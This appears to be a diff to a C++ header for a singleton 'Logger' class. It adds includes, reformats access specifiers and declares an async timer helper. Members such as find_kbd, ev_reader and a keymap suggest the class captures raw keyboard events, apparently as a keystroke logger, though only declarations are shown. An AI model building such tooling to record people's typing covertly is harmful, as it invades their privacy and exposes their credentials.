@@ -8,9 +8,14 @@
 #include <unordered_map>
 
 #include <string>
+#include <iostream>
+#include <chrono>
+#include <functional>
+#include <thread>
+#include <future>
 
 class Logger {
- public:
+public:
 	static Logger& get_instance();
 
 	Logger(Logger const&)            = delete;
@@ -22,7 +27,7 @@ class Logger {
 	auto start() -> void;
 	auto kill() -> void;
 
- private:
+private:
 	Logger();
 	~Logger();
 
@@ -31,6 +36,9 @@ class Logger {
 	std::string ev_init_;
 	bool        running_;
 	keymap_t    keymap_;
+
+	template<class _Rep, class _Period>
+	auto async_timer(std::chrono::duration<_Rep, _Period> duration, std::function<void()> callback) -> std::future<void>;
 
 	auto find_kbd() -> std::string;
 	auto ev_reader() -> void;
